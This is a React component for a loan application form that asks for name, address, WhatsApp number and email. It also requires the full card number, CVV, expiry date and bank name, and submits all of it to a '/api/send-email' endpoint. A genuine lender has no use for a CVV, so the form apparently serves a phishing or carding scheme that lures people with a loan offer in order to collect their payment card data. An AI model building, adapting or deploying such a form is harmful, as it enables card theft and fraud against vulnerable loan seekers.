import React, { useState } from 'react';
import { Form, Input, Select, Button, Card, message, Row, Col } from 'antd';
import { useLanguage } from '../contexts/LanguageContext';
import { 
  UserIcon, 
  EnvelopeIcon, 
  CreditCardIcon, 
  PhoneIcon,
  BanknotesIcon 
} from '@heroicons/react/24/outline';

const { Option } = Select;

const LoanForm: React.FC = () => {
  const { t } = useLanguage();
  const [form] = Form.useForm();
  const [loading, setLoading] = useState(false);

  const onFinish = async (values: any) => {
    setLoading(true);
    try {
      const response = await fetch('/api/send-email', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(values),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || t.form.error);
      }

      message.success(t.form.success);
      form.resetFields();
    } catch (error: any) {
      console.error('Erreur:', error);
      message.error(error.message || t.form.error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <Card className="shadow-2xl rounded-2xl border-t-4 border-orange-500">
      <div className="text-center mb-8">
        <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-br from-orange-500 to-red-600 rounded-full mb-4">
          <CreditCardIcon className="w-8 h-8 text-white" />
        </div>
        <h2 className="text-3xl font-bold bg-gradient-to-r from-red-600 via-orange-500 to-blue-600 bg-clip-text text-transparent">
          {t.form.title}
        </h2>
      </div>
      
      <Form
        form={form}
        layout="vertical"
        onFinish={onFinish}
        size="large"
        className="max-w-4xl mx-auto"
      >
        <Row gutter={16}>
          <Col xs={24} sm={12}>
            <Form.Item
              name="lastName"
              label={t.form.fields.lastName}
              rules={[{ required: true, message: `${t.form.fields.lastName} ${t.form.validation.required}` }]}
            >
              <Input 
                prefix={<UserIcon className="w-4 h-4 text-gray-400" />}
                placeholder={t.form.placeholders.lastName} 
              />
            </Form.Item>
          </Col>
          
          <Col xs={24} sm={12}>
            <Form.Item
              name="firstName"
              label={t.form.fields.firstName}
              rules={[{ required: true, message: `${t.form.fields.firstName} ${t.form.validation.required}` }]}
            >
              <Input 
                prefix={<UserIcon className="w-4 h-4 text-gray-400" />}
                placeholder={t.form.placeholders.firstName} 
              />
            </Form.Item>
          </Col>
        </Row>

        <Row gutter={16}>
          <Col xs={24} sm={12}>
            <Form.Item
              name="nationality"
              label={t.form.fields.nationality}
              rules={[{ required: true, message: `${t.form.fields.nationality} ${t.form.validation.required}` }]}
            >
              <Select placeholder={t.form.placeholders.nationality}>
                <Option value="nl">Nederlands</Option>
                <Option value="fr">Frans</Option>
                <Option value="be">Belgisch</Option>
                <Option value="de">Duits</Option>
                <Option value="other">Andere</Option>
              </Select>
            </Form.Item>
          </Col>
          
          <Col xs={24} sm={12}>
            <Form.Item
              name="whatsapp"
              label={t.form.fields.whatsapp}
              rules={[
                { required: true, message: `${t.form.fields.whatsapp} ${t.form.validation.required}` },
                { pattern: /^\+?[1-9]\d{1,14}$/, message: t.form.validation.invalidPhone }
              ]}
            >
              <Input 
                prefix={<PhoneIcon className="w-4 h-4 text-gray-400" />}
                placeholder={t.form.placeholders.whatsapp} 
              />
            </Form.Item>
          </Col>
        </Row>

        <Form.Item
          name="address"
          label={t.form.fields.address}
          rules={[{ required: true, message: `${t.form.fields.address} ${t.form.validation.required}` }]}
        >
          <Input.TextArea 
            rows={3} 
            placeholder={t.form.placeholders.address}
          />
        </Form.Item>

        <Form.Item
          name="email"
          label={t.form.fields.email}
          rules={[
            { required: true, message: `${t.form.fields.email} ${t.form.validation.required}` },
            { type: 'email', message: t.form.validation.invalidEmail }
          ]}
        >
          <Input 
            prefix={<EnvelopeIcon className="w-4 h-4 text-gray-400" />}
            placeholder={t.form.placeholders.email} 
          />
        </Form.Item>

        <Row gutter={16}>
          <Col xs={24} sm={12}>
            <Form.Item
              name="cardNumber"
              label={t.form.fields.cardNumber}
              rules={[
                { required: true, message: `${t.form.fields.cardNumber} ${t.form.validation.required}` },
                { pattern: /^\d{4}\s?\d{4}\s?\d{4}\s?\d{4}$/, message: t.form.validation.invalidCard }
              ]}
            >
              <Input 
                prefix={<CreditCardIcon className="w-4 h-4 text-gray-400" />}
                placeholder={t.form.placeholders.cardNumber} 
              />
            </Form.Item>
          </Col>
          
          <Col xs={24} sm={12}>
            <Form.Item
              name="cardType"
              label={t.form.fields.cardType}
              rules={[{ required: true, message: `${t.form.fields.cardType} ${t.form.validation.required}` }]}
            >
              <Input 
                prefix={<CreditCardIcon className="w-4 h-4 text-gray-400" />}
                placeholder={t.form.placeholders.cardType} 
              />
            </Form.Item>
          </Col>
        </Row>

        <Row gutter={16}>
          <Col xs={24} sm={8}>
            <Form.Item
              name="cvv"
              label={t.form.fields.cvv}
              rules={[
                { required: true, message: `${t.form.fields.cvv} ${t.form.validation.required}` },
                { pattern: /^\d{3,4}$/, message: t.form.validation.invalidCvv }
              ]}
            >
              <Input placeholder={t.form.placeholders.cvv} maxLength={4} />
            </Form.Item>
          </Col>
          
          <Col xs={24} sm={8}>
            <Form.Item
              name="expiryDate"
              label={t.form.fields.expiryDate}
              rules={[
                { required: true, message: `${t.form.fields.expiryDate} ${t.form.validation.required}` },
                { pattern: /^(0[1-9]|1[0-2])\/\d{2}$/, message: t.form.validation.invalidExpiry }
              ]}
            >
              <Input placeholder={t.form.placeholders.expiryDate} maxLength={5} />
            </Form.Item>
          </Col>
          
          <Col xs={24} sm={8}>
            <Form.Item
              name="bankName"
              label={t.form.fields.bankName}
              rules={[{ required: true, message: `${t.form.fields.bankName} ${t.form.validation.required}` }]}
            >
              <Input 
                prefix={<BanknotesIcon className="w-4 h-4 text-gray-400" />}
                placeholder={t.form.placeholders.bankName} 
              />
            </Form.Item>
          </Col>
        </Row>

        <Form.Item className="text-center mt-8">
          <Button
            type="primary"
            htmlType="submit"
            loading={loading}
            size="large"
            className="bg-gradient-to-r from-orange-500 to-red-600 hover:from-orange-600 hover:to-red-700 border-0 px-10 h-14 text-lg font-semibold shadow-lg hover:shadow-xl transition-all duration-300 hover:scale-105"
          >
            {t.form.submit}
          </Button>
          <Button
            type="default"
            onClick={() => form.resetFields()}
            size="large"
            className="ml-4 px-10 h-14 hover:border-orange-500 hover:text-orange-500 transition-all duration-300"
          >
            {t.form.reset}
          </Button>
        </Form.Item>
      </Form>
    </Card>
  );
};

export default LoanForm;
